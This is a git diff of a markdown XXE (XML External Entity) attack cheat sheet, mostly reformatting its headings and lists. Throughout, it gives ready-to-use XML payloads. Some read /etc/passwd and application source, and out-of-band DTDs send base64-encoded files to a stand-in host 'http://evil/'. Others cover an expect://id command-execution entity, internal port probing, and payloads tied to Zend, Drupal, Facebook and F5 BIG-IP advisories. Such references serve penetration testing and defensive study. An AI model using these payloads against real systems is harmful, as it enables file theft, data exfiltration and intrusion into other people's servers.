@@ -1,6 +1,6 @@
-# XML External Entity attacks
+### XML External Entity attacks
 
-## tools
+##### tools
 +	https://github.com/ssexxe/XXEBugFind # works on compilded java code
 +	https://github.com/BuffaloWill/oxml_xxe #docs, xlsx, pptx, odt, svg ...
 +	otori
@@ -8,7 +8,7 @@
 +	https://github.com/joernchen/xxeserve
 
 
-## links
+##### links
 +	http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf (Must Read)
 +	https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf
 +	https://www.youtube.com/watch?v=eBm0YhBrT_c
@@ -20,7 +20,7 @@
 +	https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing
 +	http://phpsecurity.readthedocs.org/en/latest/Injection-Attacks.html#xml-injection
 +	https://www.sans.org/blog/exploiting-xxe-vulnerabilities-in-iis-net
-+ https://www.youtube.com/watch?v=p8wbebEgtDk
++  https://www.youtube.com/watch?v=p8wbebEgtDk
 
 - directories can be listed using `file://MY_DIR/`
 - valid XML files in ASCII or UTF-8 format can be read using `file://MY_DIR/MY_FILE`
@@ -31,19 +31,19 @@
 - internal port scan
 - relay attacks to other hosts
 
-## cheat sheet
+##### cheat sheet
 * http://web-in-security.blogspot.com.au/2016/03/xxe-cheat-sheet.html
 * http://www.securityidiots.com/Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html
 
-## validate xml
-http://www.xmlvalidation.com/index.php
+##### validate xml
+- http://www.xmlvalidation.com/index.php
 
-## test (xmlrpc)
+##### test (xmlrpc)
 ```xml
 <?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT methodName ANY ><!ENTITY xxe "system.listMethods" >]><methodCall><methodName>&xxe;</methodName></methodCall>
 ```
 
-## test
+##### test
 ```xml
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "blah" > ]><tag>&xxe;</tag>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><tag>&xxe;</tag>
@@ -51,17 +51,17 @@ http://www.xmlvalidation.com/index.php
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://../"> %xxe;]>
 ```
 
-## XXE inside a SOAP node (https://twitter.com/Agarri_FR/status/656440244116574208)
+##### XXE inside a SOAP node (https://twitter.com/Agarri_FR/status/656440244116574208)
 ```xml
 <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://0x0:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
 ```
-## Zend Framework (patched in versions 1.11.12 and 1.12.0 of Zend Framework)
-https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20120626-0_zend_framework_xxe_injection.txt
-http://framework.zend.com/security/advisory/ZF2012-01
+##### Zend Framework (patched in versions 1.11.12 and 1.12.0 of Zend Framework)
+- https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20120626-0_zend_framework_xxe_injection.txt
+- http://framework.zend.com/security/advisory/ZF2012-01
 ```xml
 <?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><methodCall><methodName>&xxe;</methodName></methodCall>
 ```
-## upload
+##### upload
 * gopher
    - useful because java doesn't support `http://login:pass@host` but ok for `ftp://`
 
@@ -71,21 +71,21 @@ http://framework.zend.com/security/advisory/ZF2012-01
  - point to remote URL will temporarily save the file (need dir listing to know name of temp file tho)
  - can upload any format not just zip
 
-## can RCE if expect module is installed and loaded (not by default)
+##### can RCE if expect module is installed and loaded (not by default)
 ```xml
 <!ENTITY a SYSTEM 'expect://id'>
 ```
-## exfil
-payload:
-  ```xml
+##### exfil
+- payload:
+```xml
 <!DOCTYPE meh [<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=index.php"><!ENTITY % dtd SYSTEM "http://evil/send.dtd">%dtd;%send;]]>
 ```
-send.dtd:
+- send.dtd:
 ```xml
 <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://evil/?%file;'>">%all;
 ```
-## exfil2
-payload:
+##### exfil2
+- payload:
 ```xml
 <?xml version="1.0" ?>
 <!DOCTYPE r [
@@ -96,12 +96,12 @@ payload:
 ]>
 <r>&exfil;</r>
 ```
-oob.xml
+- oob.xml
 ```xml
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://evil/?%data;'>">
 ```
-## synacktiv drupal services
+##### synacktiv drupal services
 ```xml
 <!DOCTYPE doc [
  <!ENTITY % remote SYSTEM "http://../test.xml">
@@ -110,12 +110,12 @@ oob.xml
  %trick;
 ]>
 ```
-test.xml:
+- test.xml:
 ```xml
 <!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'file://WOOT%payload;WOOT'>">
 ```
-if no outbound:
+- if no outbound:
 ```xml
 <!DOCTYPE doc [
  <!ENTITY % evil SYSTEM "php://filter/convert.base64-decode/resource=data:,`base64(text.xml)`">
@@ -124,8 +124,8 @@ if no outbound:
  %trick;
 ]>
 ```
-## http://www.youtube.com/watch?v=eHSNT8vWLfc "What you didn't know about XML External Entities Attacks" by Timothy Morgan
-## paper final: http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf
+###### "What you didn't know about XML External Entities Attacks" by Timothy Morgan (http://www.youtube.com/watch?v=eHSNT8vWLfc)
+###### paper final: http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf
 ## CDATA trick (works on java impl)
 
 ```xml
@@ -140,7 +140,7 @@ if no outbound:
 join.dtd contains:
 <!ENTITY all "%start;%file;%end;">
 ```
-### using file-not-found trick to solve exfiltration restrictions ("one line only" and XML metachars), but need outbound to attacker site (http://www.christian-schneider.net/GenericXxeDetection.html)
+##### using file-not-found trick to solve exfiltration restrictions ("one line only" and XML metachars), but need outbound to attacker site (http://www.christian-schneider.net/GenericXxeDetection.html)
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [  
@@ -149,12 +149,13 @@ join.dtd contains:
   %two;
   %four;
 ]>
+
 dtd-part:
 <!ENTITY % three SYSTEM "file:///etc/passwd">
 <!ENTITY % two "<!ENTITY % four SYSTEM 'file:///"%three;"'>">
 ```
 
-## facebook xxe via OpenID
+##### facebook xxe via OpenID
  - https://www.sensepost.com/blog/2014/revisting-xxe-and-abusing-protocols/
  - http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution (openid bug)
 ```xml
@@ -186,10 +187,10 @@ dtd-part:
   </XRD>
 </xrds:XRDS>
 ```
-## facebook xxe via CV
- - http://www.attack-secure.com/blog/hacked-facebook-word-document
+##### facebook xxe via CV
+- http://www.attack-secure.com/blog/hacked-facebook-word-document
 
-## portcullis F5 big-ip
+##### portcullis F5 big-ip
 ```xml
 https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-6032/
 https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-6033/
@@ -220,14 +221,16 @@ action=write&contents=<?xml version="1.0" encoding="utf-8"?>
   </view>
 </viewList>&name=asdasd
 ```
-## fuzz
+##### fuzz
  - xmlfuzz
 
-## more tricks
+##### more tricks
  - http://www.pwntester.com/blog/2013/11/28/abusing-jar-downloads/
  - https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/
- - https://twitter.com/Agarri_FR/status/595598007996919808 "Use `%payload;://xxx` as the final URL for inline leak via error messages (Java, at least)" "I used that trick last week: dynamic DTD w/o OOB leak (very uncommon), no data outside of attributes, verbose Java parser"
- - https://twitter.com/Agarri_FR/status/659182619796574209 "Under Java, FileInputStream will refuse to open "/" and "file:/" (they are directories). But `netdoc:/` is OK"
+ - https://twitter.com/Agarri_FR/status/595598007996919808 
+      - Use `%payload;://xxx` as the final URL for inline leak via error messages (Java, at least)" "I used that trick last week: dynamic DTD w/o OOB leak (very uncommon), no data outside of attributes, verbose Java parser"
+ - https://twitter.com/Agarri_FR/status/659182619796574209 
+      - "Under Java, FileInputStream will refuse to open "/" and "file:/" (they are directories). But `netdoc:/` is OK"
  - `file:///proc/self/cwd/../config/` # Java
  - https://www.synack.com/blog/a-deep-dive-into-xxe-injection/
  - https://mikeknoop.com/lxml-xxe-exploit/
